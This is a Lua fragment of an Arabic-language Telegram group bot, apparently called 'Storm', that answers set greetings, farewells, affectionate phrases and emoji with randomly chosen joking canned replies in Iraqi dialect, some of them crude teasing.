if text == 'باي' or text == 'باي باي' or text == 'مع السلامه' or text == 'مع سلامه'  or text == 'مع السلامة' or text == 'مع سلامة' or text == 'بااي'  or text == 'باااي' or text == 'بايي'  or text == 'جاو' then if  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'تعال خل نكمل سالفتنه وين رايح 😧','جاي اشاقه تعال لضوج ','دفعه مردي وعصى كردي 😌','منو زعلك حته تروح 😥','شبيك ضايج تعال 😨','الله وياك دروح مختنكه ونته موجود ☹️','هاك الف شتري بيها لفتين فلافل 🌝💋','سلملي ع ئمك 🤷‍♀️','بعد وكت وين ',"لله وياكـ💙✨ يا • ﻋٰۧﻋٰ̯ۧـسۂﻝَُّ↵⁽🍯̯⁾ֆ‘",'تعال وين رايح عندي شغله وياك ','تعال لضل هيج ترا مكلنه شي بسرعه دكول باي 😐','الله وياك والتكسي ع حساب المدير 😂 ماعليه اني ' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')end end
if text == 'احم' or text == 'ئحم' or text == 'حم' or text == 'أحم' or text == 'أحم' or text == 'احم احم' then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'جيبوله مي 😅','شبيك تتحمحم نطو مي خطيه غص بلكمته ','خير 🙊','تفضل ☹️','والله اشكال 🏼‍♀️','احمات 😏','طبوله ع ضهره 🙃','ها خير شبيك ' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == 'تعالي خاص' or text == 'تعال خاص' or text == 'تعي خاص' or text == 'نع خاص' or text == 'خاص'  or text == 'خاصج'  or text == 'خاصك'  or text == 'شوف الخاص'  or text == 'شوف خاصك'  or text == 'شوفي خاصج' or text == 'تعاي خاص😂'  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'عيب ','خالتك الشكره  احسن ترضها اخويا يزحف ع اختك 😐🤷‍♀️','عب نجب و ولي منا 🙊‍♀️','محضوره دز رساله وتع خاص 🤷🏼‍♀️','شبيك مشايف بنات ؟ ','ولي ','ما 😌','ولي لك 😒','وعود صاك ئنته ؟','ئذا الموضوع حساس اجيك 🌝','تعال حتطفي الكهرباء 😶' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == "شلونك" or text== "شلونج" or text== "شونكم" or text== "شونك" or text== "شونجج"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'  اۢنٰـۛتهہ شعليك بيهة','  مــﮫـمـ❥ـوﯢمـ۾☹ ','تٌمآم حٍـيَآتٌيَ ۆآنْتٌ  ','ۆآلُلُہ مۆ ڒٍيَنْ😢 ','   بْخـيَر ۆصٍحٍـہةّ ۆعآفَيَہ😌','  آلُلُةّ ڒٍيَنْ لُۆ مگبْلُ ',"آلـْ ح ـمـِْدِّ اللّـٰھ وانٓــتــٰـہ/ي ࿐❥ 🌎🌸" ,'  مۆ گنْآلُہةّ لُحٍـمدِ لُلُہةّ ','  آةّۆۆۆۆ شُگدِ تٌلُحٍ آنْتٌ ','  بْلُ عبْآس آبْۆ آلُفَآضٍلُ آنْيَ لُحٍـمدِلُلُہةّ  ','تمام وانت/ي شلونك/ج🎈','تمام وانت/ي شلونك/ج'} storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end   end
if text == ""..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم')..""  or text == ''..botname..'' then  if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then  local taha = {'  آنْجٍبْ لُگ آلُبْآرحٍـةّ تٌغَلُطً علُيَةّ 😭😒 ','  ۆعمةّ آنْشُآلُلُہةّ شُبْيَگ يَلُآ گۆلُ 😒 ','   بْعدِ رۆحٍـيَ آمرنْيَ آنْتٌ 😍😘','  غَيَر يَگعدِ رآحٍـةّ آلُڒٍآحٍـفَ 😝😂 ','  ۆلُگ شُبْيَگ خـبْصٍتٌنْيَ بْس صٍيَحٍ مۆ دِآ آنْسقَ ۆيَةّ بْنْتٌ 😤 ',' تٌرآ مشُتٌغَلُ مآ ۆآگفَ ','  آيَ آيَ آجٍتٌيَ آلُمصٍآلُحٍ يَلُآ آحٍـجٍيَ شُعنْدِگ😓 ','   غَيَر يَبْطًلُ ۆبْعدِ مآ يَلُحٍ ۆيَخـلُيَنْيَ آرتٌآحٍ 😰','   شبي معاجبك ',' تاج راسي كول حبيبي 😻🙊😚  ','  ها حياتي اامرني كلبي 😇 ',' حياتي انت كول بعد روحي 🙊  ',' فضها كول شرايد تعبتوني😢😞  ','   تفصل يروحتي '} storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == "بوت" then  if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then local taha = {'   نجب لك صارت قديمه صيحلي باسمي 😒💛','ها احجي شتريد 😏 صيحلي باسمي بعد لدكول بوت😢   ','  لۧاٲ   مو بوت اقرا اسمي✨ ',' نْجٍبْ لُگ عنْدِيَ آسم ۆصٍيَحٍـنْيَ بْيَة 😟😤ّ'} storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == "شسمك" then  if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then  local taha = {'اسمي (`'..(tahadevstorm:get(DEVSTOR..'storm:name') or 'ستورم')..'`) قائد القواة العسكريه 😎😂'} storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == "هلو" or text== "هلا" or text== "هاي"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then     local taha = {' هـُ‘ـُلُٱ بُـ‘ـُيُـ‘ـُكُ شُـ‘ـُوٌنُـ‘ـكُ   ','   هّـلَأّوٌتٌ عٌلَ نِبًيِّ صّـمًوٌنِ حًأّر وٌلَبًلَبًيِّ 😻','   يِّهّـلَأّ وٌأّلَلَهّ نِوٌرتٌـنِأّ حًمًبًقُلَبًيِّ ','  کْوٌلَ سِـلَأّمً عٌلَيِّکْمً لَتٌـصّـيِّر مًأّيِّعٌ  ','   هّـلَأّ حًيِّأّتٌـيِّ مًنِوٌر أّنِتٌ بًسِـ بًدٍوٌنِ ﺰحًفُـ رجّـأّئأّأّ 😂😂','لَأّ هّـلَهّ وٌلَأّ مًرحًبًأّ  ','  أّهّـوٌوٌوٌ أّجّـهّ أّلَﺰأّحًفُ   ','   کْلَ أّلَهّـلَأّ بًيِّکْ وٌبًجهّـأّتٌـکْ خِـصّـمً أّلَحًجّـيِّ ضًـيِّفُ جّـهّـأّتٌـکْ 😉😂','   يِّعٌمًيِّ هّـلَأّ بًيِّکْ مًنِيِّنِ مًأّ جّـيِّتٌ 😒','هلوات عيونـي نورت🌷','هلُۆآتٌ حٍـيَـ{ლ}ـآتٌيَ┆✨😽💞','هـايـات يـروحـي┋🌸','يههلا بيك حياتي 💛🌿'}      storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')   end end
if text == "سلام عليكم" or text== "سلام"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then       local taha = {'  وٌعٌلَيِّکْمً أّلَسِـلَأّمً وٌرحًمًةّ أّلَلَهّ وٌبًرکْأّتٌـهّ ','   وٌعٌلَيِّکْمً سِـلَأّمً شُـوٌنِکْ حًيِّأّتٌـيِّ شُـخِـّـبًأّرکْ 😋😇','کْلَ أّلَهّـلَأّ بًيِّکْ حًمًبًيِّ 😆 ','   أّيِّ عٌوٌدٍ ثًـکْيِّلَ يِّسِـلَمً يِّلَأّ عٌيِّنِيِّ کْمًلَ أّلَسِـلَأّمً مًأّلَتٌـکْ وٌبًلَشُ أّﺰحًفُ 😂','   يِّهّـلَأّ وٌأّلَلَهّ أّشُـلَوٌنِکْمً شُـخِــبًأّرکْمً أّبوٌکْ شُـوٌنِهّ ','وعليـكم السلام ورحمـة الله وبركاتهُ','وعليكم السلام والرحمه🏌🏿‍♀️','ﯛ୭ﯠ۶ـہٰٰٰٖٖٖلہٰٰٰٖٖٖيکگہٰٰٰٖٖٖمہٰٰٰٖٖٖہ ٵٴلہٰٰٰٖٖٖسہلہٰٰٰٖٖٖاٴمہٰٰٰٖٖٖہ ┆ ➰✌️🏿'}  storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == "منور" or text== "منورين" or text== "منوره"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then       local taha = {'   أّکْيِّدٍ مًنِوٌر بًوٌجّـوٌدٍيِّ أّنِيِّ ☺',' أّيِّ عٌمًيِّ کْلَهّـأّ وٌأّسِـطِأّتٌ مًوٌ صّـوٌجّـکْمً وٌأّلَلَهّـيِّ 😢  ',' لَأّ مًوٌ مًنِوٌر وٌأّذِأّ تٌـعٌأّنِدٍ أّدٍفُـرکْ 😒😂 ','   أّفُـتٌـهّـمًنِأّ عٌمًيِّ مًنِوٌ أّنِتٌـ وٌهّـوٌ ','   هّـأّ لَأّﺰمً خِـيِّلَتٌ عٌلَيِّةّ 😂😂',' أّيِّ وٌأّلَلَةّ فُـعٌلَأّ مًنِوٌر هّـلَ صّـأّکْ 😂😓'}   storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end 
if text == "مح" or text== "محح" or text== "محح"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then       local taha = {' ﺎخٰٰ̲خྀـٓربٰ ﯛ୭ات̲كھٰربْ ♥',' ﻋِﻋٰافيٰۛـۢھٰهۃ ؛ֆ   ','ﺄموﯟعنَ ،😞💓.   ','  أّوٌفُـ أّلَلَلَهّ 😍 شُـهّـلَ بًوٌسِـهّ  ','  دٍيِّيِّيِّ لَکْ ﺰأّحًفُـ لَضًـلَ تٌـبًوٌسِ 😒 ','  أّهّـوٌووٌوٌ لَيِّشُـوٌفُـهّ يِّکْوٌلَ هّـوٌ مًهّـنِدٍ وٌيِّبًوٌسِ بًلَ عٌأّلَمً 😩  ','   دٍنِجّـبً لَکْ ﺰأّحًفُ 😝😂'}  storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')      end end
if text == "ضايج" or text== "ضوجه" or text== "ضايجه" or text== "حيل ضوجه" then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then       local taha = {'   كٰ̲ۛكۛلٰشۢ ،🍿ֆۦ ','  ضايج لئن كلبه مكسور 🙀😿 ','  حـٍبيبي ءّ🙍‍♂️💜 اركـ🕺🏻ـصلج🌚 ','   أّيِّ وٌأّلَلةّ ضًـوٌجّـهّـ وٌنِسِـوٌأّنِ مًأّکْوٌ وٌشُـغُلَ مًأّکْوٌ 😣😢','  أّيِّ أّلَيِّوٌمً کْآبًهّ حًيِّلَ 😞 ','  حًيِِّـأّتٌـيِّ تٌـعٌ نِلَعٌبً لَعٌبًةّ لَبًوٌسِـأّتٌ بًوٌسِـنِيِّ وٌأّبًوٌسِـکْ 😂 ','  هّـهّـهّـهّـهّـهّـهّ دٍنِجّـبً وٌيِّنِ أّکْوٌ ضًـوٌجّـهّ 😝 ',' أّلَلَلَلَلَهّـمً لَأّ شُـمًأّتٌـهّ 😂',"حـٍبيبي ءّ🙍‍♂️💜 اركـ🏻ـصلج🌚" } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')  end end
if text == "صباحو" or text== "صباح الخير"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then   local taha = {'  صباحو النور اشرقت وانورت ','صۢبٰاζ النور 😍   ','  صۢبٰاζـۢوٰﯟ ،☀️ عسل 😋😎 ','  صباحو النور يا نور 😻😹 ' } storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')   end   end
if text == "زاحف" or text== "زواحف"  then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then    local taha = {'  اهوو هم زحف 😢😂 ','  على خالتك¤_¤  ',' شكو تزحف ولك 😝 خلوني بس اني ازحف   ','  أّسِـمًيِّ 😌','  أّنِتٌ شُـعٌلَيِّکْ بًأّسِـمًيِّ 😕  '}   storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md') end end
if text == "احبك" or text== "احبج" then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then    local taha = {'  اشتم ريحـة زحف يمعودين🎈 ','  مي تو واني اموت بيك/ج♥️ ','  بعد روحي واني احبكم هم بس لتزحفلي رجاا 💋 ','  ولك ما تبطل زحفك 😹 صارت قديمه ترا  ','   أّوٌفُ أّلَلَهّـهّـهّـ أّنِيِّ أّمًوٌتٌـنِ بًيِّکْ وٌلَعٌبًأّسِ 😢','متستحي ','ئوف فديتك ربك ','ماحترمك شلون احبك ','حبيبي المطور بس ','ماحبك 🤤','كلبي انته 😶❤️','اموتن بيك ❤️','اموعن اذوبن 💔','ئنته ئلنفس مال اني ❤️😋','شبيك مشايف بنات هيج جفاف ','ئنته ئلعشق ','طيني بوسه وحبك 🤗','لزكت 😕','انت ليش يا ابنية اشوفها ادكول الها احبج صدك متستحي على نفسك 😒💔', 'فدوة الحلك ', 'باع حضي مناقصني زواحف ولي راح احضرك😪😂','اني وانت كلب واحد بالنفس صاعد ونازل 🙊😻','تفووو عليك ماريد حبك 😂🙊','اموت عليك يروحي 😻'}      storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')   end end
if text == "هه" or text== "ههه" or text== "هههه" or text== "ههههه" or text== "هههههه" or text== "ههههههه" or text== "ههههههههه" or text== "هههههههههههه" or text== "هههههههههههههههههه" then if not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then   local taha = {'دووم الضحُــكه  يرويحتي🍃   ',' انت شبيك تخبلت 😨😹  ',' دووم الضحكـه 😽  ','   كافي تضخك  انت مو زغير 😎','انت شبيك تخبلت 😨😹😹   ','  وٌأّلَلَهّ مًأّکْوٌ فُـأّيِّدٍهّ وٌيِّأّکْ ','انت شبيك تخبلت 😒😨😹','ضحكتك 🚶 مال مايعين  بطلها 😹'}    storm_sendMsg(msg.chat_id_, msg.id_, 1, ''..taha[math.random(#taha)]..'', 1, 'md')  end end
if text =="🌚" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• فـﮧديت صخـﮧامك🙊👄"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text == "🌚🌚" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• فـﮧديت صخـﮧامك🙊👄"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text == "🌚🌚🌚" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• فـﮧديت صخـﮧامك🙊👄"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text == "🌚🌚🌚🌚" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "• فـﮧديت صخـﮧامك🙊👄"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ  ۶ الماشي✨🚶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ 🌝💙 ۶ الماشي✨🚶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻🚶🚶🏻🚶🏻" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ 🌝💙 ۶ الماشي✨🚶🏻"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🚶🏻🚶🏻🚶" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شـﮫـۛالـٰٰ̲ضـِۛـوٰ୭ٰۛٳٲ 🌝💙 ۶ الماشي✨🚶"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙈" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "» ﺷــ๋͜ـﮭڸ خــ๋͜ـجل ﮪ 💗😻̯͡"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙈🙈" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "» ﺷــ๋͜ـﮭڸ خــ๋͜ـجل ﮪ 💗😻̯͡"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙈🙈🙈" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "» ﺷــ๋͜ـﮭڸ خــ๋͜ـجل ﮪ 💗😻̯͡"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙈🙈🙈🙈" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "» ﺷــ๋͜ـﮭڸ خــ๋͜ـجل ﮪ 😻̯͡"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙊🙊🙊🙊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل يبن القرده 😢"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙊🙊🙊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل يبن القرده 😹😢"   storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙊🙊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل يبن القرده 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="🙊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل يبن القرده "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😍😍😍😍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "صعد الحب🙄 الله يستر😹💔 من الزحف "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😍😍😍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "صعد الحب🙄 الله يستر😹💔 من الزحف 😂😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😍😍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "صعد الحب🙄 الله يستر😹💔 من الزحف 😂😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😍" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "صعد الحب الله يستر😹💔 من الزحف 😂😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😂😂😂😂" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحـكه😽🎈 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😂😂😂" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحـكه😽🎈 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😂😂" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحـكه😽🎈 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😂" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "دوم الضحـكه😽🎈 "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😉😉😉😉" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الغمزه 🙀 تموت 🙈🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😉😉😉" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الغمزه 🙀 تموت 🙈🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😉😉" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الغمزه 🙀 تموت 🙈🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😉" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "باع الغمزه 🙀 تموت 🙈🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😳😳😳😳" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك 🙀 مصدوم شنو 🙄 جديده عليك حتى تنصدم ♥️"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😳😳😳" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك 🙀 مصدوم شنو 🙄 جديده عليك حتى تنصدم ♥️🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😳😳" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك 🙀 مصدوم شنو 🙄 جديده عليك حتى تنصدم ♥️🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😳" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شبيك 🙀 مصدوم شنو 🙄 جديده عليك حتى تنصدم ♥️🍃"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😠😠😠😠" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😍😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😠😠😠" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😍😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😠😠" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😠" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😍😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😡😡😡😡" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😡😡😡" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😡😡" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😡" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "حمه الصيني طفوه 😍😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😭😭😭😭" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا تبجي يروحي محد يسوه تبجيله ☺😘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end 
if text =="😭😭😭" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا تبجي يروحي محد يسوه تبجيله ☺😘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😭" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا تبجي يروحي محد يسوه تبجيله ☺😘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😭" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "لا تبجي يروحي محد يسوه تبجيله ☺😘"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😌😌😌😌" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت  الرقه مالتك 😉😇🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😌😌😌" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت 😻 الرقه مالتك 😇🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😌😌" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت 😻 الرقه مالتك 😉"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😌" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت  الرقه مالتك 😉😇"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💃💃💃💃" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شددها ابو سميره  خوش تهز "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💃💃💃" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شددها ابو سميره 😂 خوش تهز 😹😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💃💃" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شددها ابو سميره 😂 خوش تهز "  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💃" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "شددها ابو سميره  خوش تهز 😹"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="💃" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هاي وين دا تباوع ولك😹🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="👀👀" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "هاي وين دا تباوع ولك😹😹🙊"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😱😱😱😱" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عزا العزاك هاي شفت ولك 😂😂"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😱😱😱" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عزا العزاك هاي شفت ولك 😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😱😱" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عزا العزاك هاي شفت ولك 😂😂😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😱" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "عزا العزاك هاي شفت ولك 😂😂😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😊😊😊😊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل كله 😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😊😊😊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل كله 😎"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😊😊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل كله 😎😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
if text =="😊" and  not tahadevstorm:get(DEVSTOR..'lock:reoly:bot'..bot_id) then taha =   "فديت الخجل كله 😍"  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha, 1, "html") end
